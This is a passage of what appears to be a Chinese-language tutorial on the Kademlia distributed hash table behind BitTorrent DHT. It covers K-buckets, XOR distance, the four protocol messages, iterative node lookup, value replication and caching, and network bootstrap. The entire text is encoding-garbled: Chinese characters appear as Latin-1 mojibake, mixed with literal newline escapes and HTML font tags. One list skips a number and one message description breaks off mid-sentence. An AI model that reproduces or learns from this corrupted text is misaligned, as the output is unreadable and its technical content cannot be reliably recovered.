‡èŠ‚ç‚¹IDæ¡ç›®çš„</font>\n\n\næ¯ä¸ªåˆ—è¡¨å¯¹åº”äºä¸èŠ‚ç‚¹ç›¸è·\"ç‰¹å®šèŒƒå›´è·ç¦»\"çš„ä¸€äº›èŠ‚ç‚¹ï¼ŒèŠ‚ç‚¹çš„ç¬¬nä¸ªåˆ—è¡¨ä¸­æ‰€æ‰¾åˆ°çš„èŠ‚ç‚¹çš„ç¬¬nä½ä¸è¯¥èŠ‚ç‚¹çš„ç¬¬nä½è‚¯å®šä¸åŒï¼Œè€Œå‰n-1ä½ç›¸åŒ\n\n```\n1. è¿™å°±æ„å‘³ç€å¾ˆå®¹æ˜“ä½¿ç”¨ç½‘ç»œä¸­è¿œç¦»è¯¥èŠ‚ç‚¹çš„ä¸€åŠèŠ‚ç‚¹æ¥å¡«å……ç¬¬ä¸€ä¸ªåˆ—è¡¨(ç¬¬ä¸€ä½ä¸åŒçš„èŠ‚ç‚¹æœ€å¤šæœ‰ä¸€åŠ)\n2. è€Œç”¨ç½‘ç»œä¸­å››åˆ†ä¹‹ä¸€çš„èŠ‚ç‚¹æ¥å¡«å……ç¬¬äºŒä¸ªåˆ—è¡¨(æ¯”ç¬¬ä¸€ä¸ªåˆ—è¡¨ä¸­çš„é‚£äº›èŠ‚ç‚¹ç¦»è¯¥èŠ‚ç‚¹æ›´è¿‘ä¸€ä½)\n3. ä¾æ¬¡ç±»æ¨ã€‚å¦‚æœIDæœ‰128ä¸ªäºŒè¿›åˆ¶ä½ï¼Œåˆ™ç½‘ç»œä¸­çš„æ¯ä¸ªèŠ‚ç‚¹æŒ‰ç…§ä¸åŒçš„å¼‚æˆ–è·ç¦»æŠŠå…¶ä»–æ‰€æœ‰çš„èŠ‚ç‚¹åˆ†æˆäº†128ç±»ï¼ŒIDçš„æ¯ä¸€ä½å¯¹åº”äºå…¶ä¸­çš„ä¸€ç±»\n```\n\néšç€ç½‘ç»œä¸­çš„èŠ‚ç‚¹è¢«æŸèŠ‚ç‚¹å‘ç°ï¼Œå®ƒä»¬è¢«é€æ­¥åŠ å…¥åˆ°è¯¥èŠ‚ç‚¹çš„ç›¸åº”çš„åˆ—è¡¨ä¸­ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­åŒ…æ‹¬\n\n1. <font color=red>å‘èŠ‚ç‚¹åˆ—è¡¨ä¸­å­˜ä¿¡æ¯: å½•å…¥åˆ«çš„èŠ‚ç‚¹å‘å¸ƒçš„å£°æ˜</font>\n2. ä»èŠ‚ç‚¹åˆ—è¡¨ä¸­å–ä¿¡æ¯çš„æ“ä½œ\n3. ç”šè‡³è¿˜åŒ…æ‹¬å½“æ—¶ååŠ©å…¶ä»–èŠ‚ç‚¹å¯»æ‰¾ç›¸åº”é”®å¯¹åº”å€¼çš„æ“ä½œ: è½¬å‘å…¶ä»–èŠ‚ç‚¹çš„å¯»å€è¯·æ±‚\n\n\nè¿™ä¸ªè¿‡ç¨‹ä¸­å‘ç°çš„æ‰€æœ‰èŠ‚ç‚¹éƒ½å°†è¢«åŠ å…¥åˆ°èŠ‚ç‚¹çš„åˆ—è¡¨ä¹‹ä¸­ï¼Œå› æ­¤èŠ‚ç‚¹å¯¹æ•´ä¸ªç½‘ç»œçš„æ„ŸçŸ¥æ˜¯åŠ¨æ€çš„ï¼Œè¿™ä½¿å¾—ç½‘ç»œä¸€ç›´ä¿æŒç€é¢‘ç¹åœ°æ›´æ–°ï¼Œå¢å¼ºäº†æŠµå¾¡é”™è¯¯å’Œæ”»å‡»çš„èƒ½åŠ›\n\n---\n\nåœ¨Kademliaç›¸å…³çš„è®ºæ–‡ä¸­ï¼Œåˆ—è¡¨ä¹Ÿç§°ä¸ºKæ¡¶ï¼Œå…¶ä¸­Kæ˜¯ä¸€ä¸ªç³»ç»Ÿå˜é‡ï¼Œå¦‚20ï¼Œæ¯ä¸€ä¸ªKæ¡¶æ˜¯ä¸€ä¸ªæœ€å¤šåŒ…å«Kä¸ªæ¡ç›®çš„åˆ—è¡¨ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç½‘ç»œä¸­æ‰€æœ‰èŠ‚ç‚¹çš„ä¸€ä¸ªåˆ—è¡¨(å¯¹åº”äºæŸä¸€ä½ï¼Œä¸è¯¥èŠ‚ç‚¹ç›¸è·ä¸€ä¸ªç‰¹å®šçš„è·ç¦»)æœ€å¤šåŒ…å«20ä¸ªèŠ‚ç‚¹ã€‚éšç€å¯¹åº”çš„bitä½å˜ä½(å³å¯¹åº”çš„å¼‚æˆ–è·ç¦»è¶Šæ¥è¶ŠçŸ­)(bitä½è¶Šå°ï¼Œå¯èƒ½çš„è·ç¦»MAXå€¼å°±è¶Šå°äº†ï¼Œå³è·ç¦»ç›®æ ‡èŠ‚ç‚¹çš„è·ç¦»è¶Šè¿‘)ï¼ŒKæ¡¶åŒ…å«çš„å¯èƒ½èŠ‚ç‚¹æ•°è¿…é€Ÿä¸‹é™(Kå®šä¹‰çš„æ˜¯è¯¥bitå¯¹åº”çš„åˆ—è¡¨æœ€å¤šèƒ½å­˜å‚¨Kä¸ªæ¡ç›®ï¼Œä½†ä¸ä¸€å®šéƒ½æ˜¯Kå­˜æ»¡ï¼Œå½“åˆ°æœ€ä½å‡ ä¸ªbitä½çš„æ—¶å€™ï¼ŒKæ¡¶é‡Œå¯èƒ½å°±åªæœ‰å‡ ä¸ªä¸ªä½æ•°çš„æ¡ç›®äº†)ã€‚ç”±äºç½‘ç»œä¸­èŠ‚ç‚¹çš„å®é™…æ•°é‡è¿œè¿œå°äºå¯èƒ½IDå·çš„æ•°é‡ï¼Œæ‰€ä»¥å¯¹åº”é‚£äº›çŸ­è·ç¦»çš„æŸäº›Kæ¡¶å¯èƒ½ä¸€ç›´æ˜¯ç©ºçš„(å¦‚æœå¼‚æˆ–è·ç¦»åªæœ‰1ï¼Œå¯èƒ½çš„æ•°é‡å°±æœ€å¤§åªèƒ½ä¸º1ï¼Œè¿™ä¸ªå¼‚æˆ–è·ç¦»ä¸º1çš„èŠ‚ç‚¹å¦‚æœæ²¡æœ‰å‘ç°ï¼Œåˆ™å¯¹åº”äºå¼‚æˆ–è·ç¦»ä¸º1çš„Kæ¡¶åˆ™æ˜¯ç©ºçš„)\n\n\n![1](Kademlia_DHT_KRPC_BitTorrentåè®®1/1.png)\n\nä»è¿™ä¸ªé€»è¾‘å›¾ä¸­å¯ä»¥çœ‹å‡º\n\n```\n1. èŠ‚ç‚¹çš„HASHå€¼å†³å®šäº†å®ƒä»¬çš„é€»è¾‘è·ç¦»ï¼Œå³Kademliaç½‘ç»œä¸­çš„ä¸‹ä¸€è·³å¯»å€æ˜¯æ ¹æ®HASH XORçš„å€¼èŒƒå›´(æ•°å€¼å¤§å°èŒƒå›´)ç»“æœå†³å®šçš„\n2. è¯¥ç½‘ç»œæœ€å¤§å¯æœ‰2^3ï¼Œå³8ä¸ªå…³é”®å­—å’ŒèŠ‚ç‚¹ï¼Œç›®å‰å…±æœ‰7ä¸ªèŠ‚ç‚¹åŠ å…¥ï¼Œæ¯ä¸ªèŠ‚ç‚¹ç”¨ä¸€ä¸ªå°åœˆè¡¨ç¤º(åœ¨æ ‘çš„åº•éƒ¨)\n3. è€ƒè™‘é‚£ä¸ªç”¨é»‘åœˆæ ‡æ³¨çš„èŠ‚ç‚¹6ï¼Œå®ƒå…±æœ‰3ä¸ªKæ¡¶(å³3bitä½)\n\nèŠ‚ç‚¹0ï¼Œ1å’Œ2(äºŒè¿›åˆ¶è¡¨ç¤ºä¸º000ï¼Œ001å’Œ010)æ˜¯ç¬¬ä¸€ä¸ªKæ¡¶çš„å€™é€‰èŠ‚ç‚¹\n000 -> 110: 6\n001 -> 110: 5\n010 -> 110: 4\n\nèŠ‚ç‚¹3ç›®å‰(äºŒè¿›åˆ¶è¡¨ç¤ºä¸º011)è¿˜æ²¡æœ‰åŠ å…¥ç½‘ç»œ\n\nèŠ‚ç‚¹4å’ŒèŠ‚ç‚¹5(äºŒè¿›åˆ¶è¡¨ç¤ºåˆ†åˆ«ä¸º100å’Œ101)æ˜¯ç¬¬äºŒä¸ªKæ¡¶çš„å€™é€‰èŠ‚ç‚¹\n100 -> 110: 2\n101 -> 110: 1 \n\nèŠ‚ç‚¹7(äºŒè¿›åˆ¶è¡¨ç¤ºä¸º111)æ˜¯ç¬¬3ä¸ªKæ¡¶çš„å€™é€‰èŠ‚ç‚¹\n111 -> 110: 1\n```\n\nå›¾ä¸­3ä¸ªKæ¡¶éƒ½ç”¨ç°è‰²åœˆè¡¨ç¤ºï¼Œå‡å¦‚Kæ¡¶çš„å¤§å°(å³Kå€¼)æ˜¯2ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªKæ¡¶åªèƒ½åŒ…å«3ä¸ªèŠ‚ç‚¹ä¸­çš„2ä¸ªã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œé‚£äº›é•¿æ—¶é—´åœ¨çº¿è¿æ¥çš„èŠ‚ç‚¹æœªæ¥é•¿æ—¶é—´åœ¨çº¿çš„å¯èƒ½æ€§æ›´å¤§ï¼ŒåŸºäºè¿™ç§é™æ€ç»Ÿè®¡åˆ†å¸ƒçš„è§„å¾‹ï¼ŒKademliaé€‰æ‹©æŠŠé‚£äº›é•¿æ—¶é—´åœ¨çº¿çš„èŠ‚ç‚¹å­˜å…¥Kæ¡¶ï¼Œè¿™ä¸€æ–¹æ³•å¢é•¿äº†æœªæ¥æŸä¸€æ—¶åˆ»æœ‰æ•ˆèŠ‚ç‚¹çš„æ•°é‡(hot hint)ï¼ŒåŒæ—¶ä¹Ÿæä¾›äº†æ›´ä¸ºç¨³å®šçš„ç½‘ç»œã€‚å½“æŸä¸ªKæ¡¶å·²æ»¡ï¼Œè€Œåˆå‘ç°äº†ç›¸åº”äºè¯¥æ¡¶çš„æ–°èŠ‚ç‚¹çš„æ—¶å€™ï¼Œé‚£ä¹ˆï¼Œå°±é¦–å…ˆæ£€æŸ¥Kæ¡¶ä¸­æœ€æ—©è®¿é—®çš„èŠ‚ç‚¹ï¼Œå‡å¦‚è¯¥èŠ‚ç‚¹ä»ç„¶å­˜æ´»ï¼Œé‚£ä¹ˆæ–°èŠ‚ç‚¹å°±è¢«å®‰æ’åˆ°ä¸€ä¸ªé™„å±åˆ—è¡¨ä¸­(ä½œä¸ºä¸€ä¸ªæ›¿ä»£ç¼“å­˜). åªæœ‰å½“Kæ¡¶ä¸­çš„æŸä¸ªèŠ‚ç‚¹åœæ­¢å“åº”çš„æ—¶å€™ï¼Œæ›¿ä»£cacheæ‰è¢«ä½¿ç”¨ã€‚æ¢å¥è¯è¯´ï¼Œæ–°å‘ç°çš„èŠ‚ç‚¹åªæœ‰åœ¨è€çš„èŠ‚ç‚¹æ¶ˆå¤±(å¤±æ•ˆ)åæ‰è¢«ä½¿ç”¨\n\n\n### 0x4: åè®®æ¶ˆæ¯\n\nKademliaåè®®å…±æœ‰å››ç§æ¶ˆæ¯\n\n```\n1. PINGæ¶ˆæ¯: ç”¨æ¥æµ‹è¯•èŠ‚ç‚¹æ˜¯å¦ä»ç„¶åœ¨çº¿\n2. STOREæ¶ˆæ¯: åœ¨æŸä¸ªèŠ‚ç‚¹ä¸­å­˜å‚¨ä¸€ä¸ªé”®å€¼å¯¹\n3. FIND_NODEæ¶ˆæ¯: æ¶ˆæ¯è¯·æ±‚çš„æ¥æ”¶è€…å°†è¿”å›è‡ªå·±æ¡¶ä¸­ç¦»è¯·æ±‚é”®å€¼æœ€è¿‘çš„Kä¸ªèŠ‚ç‚¹: å°†è¯·æ±‚è€…è¯·æ±‚çš„èŠ‚ç‚¹HASHå’Œè‡ªå·±çš„HASHè¿›è¡ŒXORè®¡ç®—ï¼Œå°†è®¡ç®—ç»“æœ\n4. FIND_VALUEæ¶ˆæ¯: ä¸FIND_NODEä¸€æ ·ï¼Œä¸è¿‡å½“è¯·æ±‚çš„æ¥æ”¶è€…å­˜æœ‰è¯·æ±‚è€…æ‰€è¯·æ±‚çš„é”®çš„æ—¶å€™ï¼Œå®ƒå°†è¿”å›ç›¸åº”é”®çš„å€¼\n```\n\næ¯ä¸€ä¸ªRPCæ¶ˆæ¯ä¸­éƒ½åŒ…å«ä¸€ä¸ªå‘èµ·è€…åŠ å…¥çš„éšæœºå€¼ï¼Œè¿™ä¸€ç‚¹ç¡®ä¿å“åº”æ¶ˆæ¯åœ¨æ”¶åˆ°çš„æ—¶å€™èƒ½å¤Ÿä¸å‰é¢å‘é€çš„è¯·æ±‚æ¶ˆæ¯åŒ¹é…\n\n\n### 0x5: å®šä½èŠ‚ç‚¹\n\nèŠ‚ç‚¹æŸ¥è¯¢å¯ä»¥å¼‚æ­¥è¿›è¡Œï¼Œä¹Ÿå¯ä»¥åŒæ—¶è¿›è¡Œï¼ŒåŒæ—¶æŸ¥è¯¢çš„æ•°é‡ç”±Î±è¡¨ç¤ºï¼Œä¸€èˆ¬æ˜¯3\n\n\n1. åœ¨èŠ‚ç‚¹æŸ¥è¯¢çš„æ—¶å€™ï¼Œå®ƒå…ˆå¾—åˆ°å®ƒKæ¡¶ä¸­ç¦»æ‰€æŸ¥è¯¢çš„é”®å€¼æœ€è¿‘çš„Kä¸ªèŠ‚ç‚¹(XORå€¼æœ€å°çš„é‚£ä¸ªæ¡ç›®æ‰€åœ¨çš„åˆ†ç»„)ï¼Œç„¶åå‘è¿™Kä¸ªèŠ‚ç‚¹å‘èµ·FIND_NODEæ¶ˆæ¯è¯·æ±‚(å› ä¸ºè¿™ä¸ªKæ¡¶å†…çš„èŠ‚ç‚¹æœ€æœ‰å¯èƒ½å¯»å€æˆåŠŸ)\n2. æ¶ˆæ¯æ¥æ”¶è€…æ”¶åˆ°è¿™äº›è¯·æ±‚æ¶ˆæ¯åå°†åœ¨ä»–ä»¬çš„Kæ¡¶ä¸­è¿›è¡ŒæŸ¥è¯¢ï¼Œå¦‚æœä»–ä»¬çŸ¥é“ç¦»è¢«æŸ¥é”®æ›´è¿‘çš„èŠ‚ç‚¹ï¼Œä»–ä»¬å°±è¿”å›è¿™äº›èŠ‚ç‚¹(æœ€å¤šKä¸ª)\n    + æ‰¾åˆ°æŸä¸ªæ¡ç›®å’Œç›®æ ‡èŠ‚ç‚¹XORä¸º0ï¼Œå³å·²ç»å¯»å€æˆåŠŸï¼Œåˆ™ç›´æ¥è¿”å›è¿™ä¸ªæ¡ç›®ç»™requesterå³å¯\n    + å¦‚æœæ²¡æ‰¾åˆ°XORç»“æœä¸º0çš„æ¡ç›®ï¼Œåˆ™é€‰å–é‚£ä¸ªXORå€¼æœ€å°çš„æ¡ç›®å¯¹åº”çš„Kæ¡¶ä¸­çš„Kä¸ªæ¡ç›®è¿”å›ç»™requesterï¼Œå› ä¸ºè¿™äº›æ¡ç›®æ˜¯æœ€æœ‰å¯èƒ½å­˜å‚¨äº†ç›®æ ‡èŠ‚ç‚¹IDæ¡ç›®çš„\n3. <font color=\"red\">æ¶ˆæ¯çš„è¯·æ±‚è€…åœ¨æ”¶åˆ°å“åº”åå°†ä½¿ç”¨å®ƒæ‰€æ”¶åˆ°çš„å“åº”ç»“æœæ¥æ›´æ–°å®ƒçš„ç»“æœåˆ—è¡¨ï¼Œè¿”å›çš„ç»“æœä¹Ÿåº”è¯¥æ’å…¥åˆ°åˆšæ‰å‘èµ·è¯·æ±‚çš„é‚£ä¸ªKæ¡¶é‡Œï¼Œè¿™ä¸ªç»“æœåˆ—è¡¨æ€»æ˜¯ä¿æŒKä¸ªå“åº”FIND_NODEæ¶ˆæ¯è¯·æ±‚çš„æœ€ä¼˜èŠ‚ç‚¹(å³ç¦»è¢«æœç´¢é”®æ›´è¿‘çš„Kä¸ªèŠ‚ç‚¹)</font>\n4. ç„¶åæ¶ˆæ¯å‘èµ·è€…å°†å‘è¿™Kä¸ªæœ€ä¼˜èŠ‚ç‚¹å‘èµ·æŸ¥è¯¢ï¼Œå› ä¸ºåˆšå¼€å§‹çš„æŸ¥è¯¢å¾ˆå¯èƒ½Kæ¡¶é‡Œå­˜çš„ä¸å…¨æ˜¯ç›®æ ‡èŠ‚ç‚¹ï¼Œè€Œæ˜¯æ½œåœ¨åœ°ç¦»ç›®æ ‡èŠ‚ç‚¹è¾ƒè¿‘çš„èŠ‚ç‚¹\n5. ä¸æ–­åœ°è¿­ä»£æ‰§è¡Œä¸Šè¿°æŸ¥è¯¢è¿‡ç¨‹ã€‚å› ä¸ºæ¯ä¸€ä¸ªèŠ‚ç‚¹æ¯”å…¶ä»–èŠ‚ç‚¹å¯¹å®ƒå‘¨è¾¹çš„èŠ‚ç‚¹æœ‰æ›´å¥½çš„æ„ŸçŸ¥èƒ½åŠ›(æ°´æ³¢æ‰©æ•£å¼çš„èŠ‚ç‚¹å¯»å€æ–¹å¼)ï¼Œå› æ­¤å“åº”ç»“æœå°†æ˜¯ä¸€æ¬¡ä¸€æ¬¡ç¦»è¢«æœç´¢é”®å€¼è¶Šæ¥è¶Šè¿‘çš„æŸèŠ‚ç‚¹ã€‚å¦‚æœæœ¬æ¬¡å“åº”ç»“æœä¸­çš„èŠ‚ç‚¹æ²¡æœ‰æ¯”å‰æ¬¡å“åº”ç»“æœä¸­çš„èŠ‚ç‚¹ç¦»è¢«æœç´¢é”®å€¼æ›´è¿‘äº†(å³å‘ç°è¿™è½®æŸ¥è¯¢çš„ç»“æœæœªå‘ç”Ÿdiffå˜åŒ–äº†)ï¼Œè¿™ä¸ªæŸ¥è¯¢è¿­ä»£ä¹Ÿå°±ç»ˆæ­¢äº†\n6. å½“è¿™ä¸ªè¿­ä»£ç»ˆæ­¢çš„æ—¶å€™ï¼Œå“åº”ç»“æœé›†ä¸­çš„Kä¸ªæœ€ä¼˜èŠ‚ç‚¹å°±æ˜¯æ•´ä¸ªç½‘ç»œä¸­ç¦»è¢«æœç´¢é”®å€¼æœ€è¿‘çš„Kä¸ªèŠ‚ç‚¹(ä»ä»¥ä¸Šè¿‡ç¨‹çœ‹ï¼Œè¿™æ˜¾ç„¶æ˜¯å±€éƒ¨çš„ï¼Œè€Œéæ•´ä¸ªç½‘ç»œï¼Œå› ä¸ºè¿™æœ¬è´¨å’Œæœ€ä¼˜è§£æœç´¢ç®—æ³•ä¸€æ ·ï¼Œå¯èƒ½é™·å…¥å±€éƒ¨æœ€ä¼˜è§£è€Œæ— æ³•è·å¾—å…¨å±€æœ€ä¼˜è§£) \n7. èŠ‚ç‚¹ä¿¡æ¯ä¸­å¯ä»¥å¢åŠ ä¸€ä¸ªå¾€è¿”æ—¶é—´ï¼Œæˆ–è€…å«åšRTTçš„å‚æ•°ï¼Œè¿™ä¸ªå‚æ•°å¯ä»¥è¢«ç”¨æ¥å®šä¹‰ä¸€ä¸ªé’ˆå¯¹æ¯ä¸ªè¢«æŸ¥è¯¢èŠ‚ç‚¹çš„è¶…æ—¶è®¾ç½®ï¼Œå³å½“å‘æŸä¸ªèŠ‚ç‚¹å‘èµ·çš„æŸ¥è¯¢è¶…æ—¶çš„æ—¶å€™ï¼Œå¦ä¸€ä¸ªæŸ¥è¯¢æ‰ä¼šå‘èµ·ï¼Œå½“ç„¶ï¼Œé’ˆå¯¹æŸä¸ªèŠ‚ç‚¹çš„æŸ¥è¯¢åœ¨åŒä¸€æ—¶åˆ»ä»æ¥ä¸è¶…è¿‡Î±ä¸ª\n\n\n### 0x6: å®šä½å’Œå†—ä½™æ‹·è´èµ„æº\n\né€šè¿‡æŠŠèµ„æºä¿¡æ¯ä¸é”®è¿›è¡Œæ˜ å°„ï¼Œèµ„æºå³å¯è¿›è¡Œå®šä½ï¼Œæ‚å‡‘è¡¨æ˜¯å…¸å‹çš„ç”¨æ¥æ˜ å°„çš„æ‰‹æ®µã€‚ç”±äºä»¥å‰çš„STOREæ¶ˆæ¯ï¼Œå­˜å‚¨èŠ‚ç‚¹å°†ä¼šæœ‰å¯¹åº”STOREæ‰€å­˜å‚¨çš„ç›¸å…³èµ„æºçš„ä¿¡æ¯ã€‚å®šä½èµ„æºæ—¶ï¼Œå¦‚æœä¸€ä¸ªèŠ‚ç‚¹å­˜æœ‰ç›¸åº”çš„èµ„æºçš„å€¼çš„æ—¶å€™ï¼Œå®ƒå°±è¿”å›è¯¥èµ„æºï¼Œæœç´¢ä¾¿ç»“æŸäº†ï¼Œé™¤äº†è¯¥ç‚¹ä»¥å¤–ï¼Œå®šä½èµ„æºä¸å®šä½ç¦»é”®æœ€è¿‘çš„èŠ‚ç‚¹çš„è¿‡ç¨‹ç›¸ä¼¼\n\n\n1. è€ƒè™‘åˆ°èŠ‚ç‚¹æœªå¿…éƒ½åœ¨çº¿çš„æƒ…å†µï¼Œèµ„æºçš„å€¼è¢«å­˜åœ¨å¤šä¸ªèŠ‚ç‚¹ä¸Š(èŠ‚ç‚¹ä¸­çš„Kä¸ª)ï¼Œå¹¶ä¸”ï¼Œä¸ºäº†æä¾›å†—ä½™ï¼Œè¿˜æœ‰å¯èƒ½åœ¨æ›´å¤šçš„èŠ‚ç‚¹ä¸Šå‚¨å­˜å€¼\n2. å‚¨å­˜å€¼çš„èŠ‚ç‚¹å°†å®šæœŸæœç´¢ç½‘ç»œä¸­ä¸å‚¨å­˜å€¼æ‰€å¯¹åº”çš„é”®æ¥è¿‘çš„Kä¸ªèŠ‚ç‚¹å¹¶ä¸”æŠŠå€¼å¤åˆ¶åˆ°è¿™äº›èŠ‚ç‚¹ä¸Šï¼Œè¿™äº›èŠ‚ç‚¹å¯ä½œä¸ºé‚£äº›ä¸‹çº¿çš„èŠ‚ç‚¹çš„è¡¥å……\n3. å¦å¤–ï¼Œå¯¹äºé‚£äº›æ™®éæµè¡Œçš„å†…å®¹ï¼Œå¯èƒ½æœ‰æ›´å¤šçš„è¯·æ±‚éœ€æ±‚ï¼Œé€šè¿‡è®©é‚£äº›è®¿é—®å€¼çš„èŠ‚ç‚¹æŠŠå€¼å­˜å‚¨åœ¨é™„è¿‘çš„ä¸€äº›èŠ‚ç‚¹ä¸Š(ä¸åœ¨Kä¸ªæœ€è¿‘èŠ‚ç‚¹çš„èŒƒå›´ä¹‹ç±»)æ¥å‡å°‘å­˜å‚¨å€¼çš„é‚£äº›èŠ‚ç‚¹çš„è´Ÿè½½ï¼Œè¿™ç§æ–°çš„å­˜å‚¨æŠ€æœ¯å°±æ˜¯ç¼“å­˜æŠ€æœ¯ï¼Œé€šè¿‡è¿™ç§æŠ€æœ¯ï¼Œä¾èµ–äºè¯·æ±‚çš„æ•°é‡ï¼Œèµ„æºçš„å€¼è¢«å­˜å‚¨åœ¨ç¦»é”®è¶Šæ¥è¶Šè¿œçš„é‚£äº›èŠ‚ç‚¹ä¸Š(èµ„æºçƒ­åº¦è¶Šé«˜ï¼Œç¼“å­˜cacheå°±è¶Šå¹¿æ³›)ï¼Œè¿™ä½¿å¾—é‚£äº›æµè¡Œçš„æœç´¢å¯ä»¥æ›´å¿«åœ°æ‰¾åˆ°èµ„æºçš„å‚¨å­˜è€…\n5. ç”±äºè¿”å›å€¼çš„èŠ‚ç‚¹çš„NODE_IDè¿œç¦»å€¼æ‰€å¯¹åº”çš„å…³é”®å­—ï¼Œç½‘ç»œä¸­çš„\"çƒ­ç‚¹\"åŒºåŸŸå­˜åœ¨çš„å¯èƒ½æ€§ä¹Ÿé™ä½äº†ã€‚ä¾æ®ä¸é”®çš„è·ç¦»ï¼Œç¼“å­˜çš„é‚£äº›èŠ‚ç‚¹åœ¨ä¸€æ®µæ—¶é—´ä»¥åå°†ä¼šåˆ é™¤æ‰€å­˜å‚¨çš„ç¼“å­˜å€¼ã€‚DHTçš„æŸäº›å®ç°(å¦‚Kad)å³ä¸æä¾›å†—ä½™(å¤åˆ¶)èŠ‚ç‚¹ä¹Ÿä¸æä¾›ç¼“å­˜ï¼Œè¿™ä¸»è¦æ˜¯ä¸ºäº†èƒ½å¤Ÿå¿«é€Ÿå‡å°‘ç³»ç»Ÿä¸­çš„é™ˆæ—§ä¿¡æ¯ã€‚åœ¨è¿™ç§ç½‘ç»œä¸­ï¼Œæä¾›æ–‡ä»¶çš„é‚£äº›èŠ‚ç‚¹å°†ä¼šå‘¨æœŸæ€§åœ°æ›´æ–°ç½‘ç»œä¸Šçš„ä¿¡æ¯(é€šè¿‡NODE_LOOKUPæ¶ˆæ¯å’ŒSTOREæ¶ˆæ¯)ã€‚å½“å­˜æœ‰æŸä¸ªæ–‡ä»¶çš„æ‰€æœ‰èŠ‚ç‚¹éƒ½ä¸‹çº¿äº†ï¼Œå…³äºè¯¥æ–‡ä»¶çš„ç›¸å…³çš„å€¼(æºå’Œå…³é”®å­—)çš„æ›´æ–°ä¹Ÿå°±åœæ­¢äº†ï¼Œè¯¥æ–‡ä»¶çš„ç›¸å…³ä¿¡æ¯ä¹Ÿå°±ä»ç½‘ç»œä¸Šå®Œå…¨æ¶ˆå¤±äº† \n\n\n### 0x7: åŠ å…¥ç½‘ç»œ\n\n1. æƒ³è¦åŠ å…¥ç½‘ç»œçš„èŠ‚ç‚¹é¦–å…ˆè¦ç»å†ä¸€ä¸ªå¼•å¯¼è¿‡ç¨‹ã€‚åœ¨å¼•å¯¼è¿‡ç¨‹ä¸­ï¼ŒèŠ‚ç‚¹éœ€è¦çŸ¥é“å…¶ä»–å·²åŠ å…¥è¯¥ç½‘ç»œçš„æŸä¸ªèŠ‚ç‚¹çš„IPåœ°å€å’Œç«¯å£å·(å¯ä»ç”¨æˆ·æˆ–è€…å­˜å‚¨çš„åˆ—è¡¨ä¸­è·å¾—)ã€‚å‡å¦‚æ­£åœ¨å¼•å¯¼çš„é‚£ä¸ªèŠ‚ç‚¹è¿˜æœªåŠ å…¥ç½‘ç»œï¼Œå®ƒä¼šè®¡ç®—ä¸€ä¸ªç›®å‰ä¸ºæ­¢è¿˜æœªåˆ†é…ç»™å…¶ä»–èŠ‚ç‚¹çš„éšæœºIDå·ï¼Œç›´åˆ°ç¦»å¼€ç½‘ç»œï¼Œè¯¥èŠ‚ç‚¹ä¼šä¸€ç›´ä½¿ç”¨è¯¥IDå· \n2. æ­£åœ¨åŠ å…¥Kademliaç½‘ç»œçš„èŠ‚ç‚¹åœ¨å®ƒçš„æŸä¸ªKæ¡¶ä¸­æ’å…¥å¼•å¯¼èŠ‚ç‚¹(åŠ å…¥è¯¥ç½‘ç»œçš„ä»‹ç»äºº)(è´Ÿè´£åŠ å…¥èŠ‚ç‚¹çš„åˆå§‹åŒ–å·¥ä½œ)ï¼Œç„¶åå‘å®ƒçš„å”¯ä¸€é‚»å±…(å¼•å¯¼èŠ‚ç‚¹)å‘èµ·NODE_LOOKUPæ“ä½œè¯·æ±‚æ¥å®šä½è‡ªå·±ï¼Œè¿™ç§\"è‡ªæˆ‘å®šä½\"å°†ä½¿å¾—Kademliaçš„å…¶ä»–èŠ‚ç‚¹(æ”¶åˆ°è¯·æ±‚çš„èŠ‚ç‚¹)èƒ½å¤Ÿä½¿ç”¨æ–°åŠ å…¥èŠ‚ç‚¹çš„Node Idå¡«å……ä»–ä»¬çš„Kæ¡¶(é‚»å±…äº’ç›¸è®¤è¯†)\n3. åŒæ—¶ä¹Ÿèƒ½å¤Ÿä½¿ç”¨é‚£äº›æŸ¥è¯¢è¿‡ç¨‹çš„ä¸­é—´èŠ‚ç‚¹(ä½äºæ–°åŠ å…¥èŠ‚ç‚¹å’Œå¼•å¯¼èŠ‚ç‚¹çš„æŸ¥è¯¢è·¯å¾„ä¸Šçš„å…¶ä»–èŠ‚ç‚¹)æ¥å¡«å……æ–°åŠ å…¥èŠ‚ç‚¹çš„Kæ¡¶(ç›¸å½“äºå®Œæˆä¸€ä¸ªDNSé€’å½’æŸ¥è¯¢åï¼Œæ²¿é€”è·¯å¾„ä¸Šçš„DNS IPéƒ½è¢«è®°å½•äº†)ã€‚æƒ³è±¡ä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹\n    + æ–°åŠ å…¥çš„èŠ‚ç‚¹å¯èƒ½å’Œ\"å¼•å¯¼èŠ‚ç‚¹\"è·ç¦»å¾ˆè¿œï¼Œå®ƒä¸€ä¸Šæ¥å°±å‘ç¦»è‡ªå·±å‡ ä½•è·ç¦»æœ€è¿œçš„å¼•å¯¼èŠ‚ç‚¹é—®è¯: \"è°çŸ¥é“æˆ‘è‡ªå·±è¿™ä¸ªèŠ‚ç‚¹åœ¨å“ª?\"ï¼Œå¼•å¯¼èŠ‚ç‚¹ä¼šå°½åŠ›å»å›ç­”è¿™ä¸ªé—®é¢˜ï¼Œå³å¼•å¯¼èŠ‚ç‚¹ä¼šæŠŠè‡ªå·±Kæ¡¶å†…æœ€æœ‰å¯èƒ½çŸ¥é“è¯¥èŠ‚ç‚¹ä½ç½®(å³ç¦»è¯¥å‡ ç‚¹XORå‡ ä½•è·ç¦»æœ€è¿‘çš„Kä¸ªç‚¹è¿”å›ç»™æ–°åŠ å…¥çš„è¯·æ±‚èŠ‚ç‚¹)\n    + <font color=\"red\">æ–°åŠ å…¥çš„è¯·æ±‚æ–¹æ”¶åˆ°äº†Kä¸ªèŠ‚ç‚¹åï¼ŒæŠŠè¿™Kä¸ªèŠ‚ç‚¹ä¿å­˜è¿›è‡ªå·±çš„Kæ¡¶ï¼Œç„¶åç»§ç»­å‘è¿™äº›èŠ‚ç‚¹å»\"è¯¢é—®(å‘èµ·find_nodeè¯·æ±‚)\"è‡ªå·±çš„èŠ‚ç‚¹åœ¨å“ªï¼Œè¿™äº›èŠ‚ç‚¹ä¼šæ”¶åˆ°è¿™äº›è¯·æ±‚ï¼ŒåŒæ—¶ä¹ŸæŠŠæ–°åŠ å…¥èŠ‚ç‚¹ä¿å­˜è¿›è‡ªå·±çš„Kæ¡¶å†…</font>\n    + 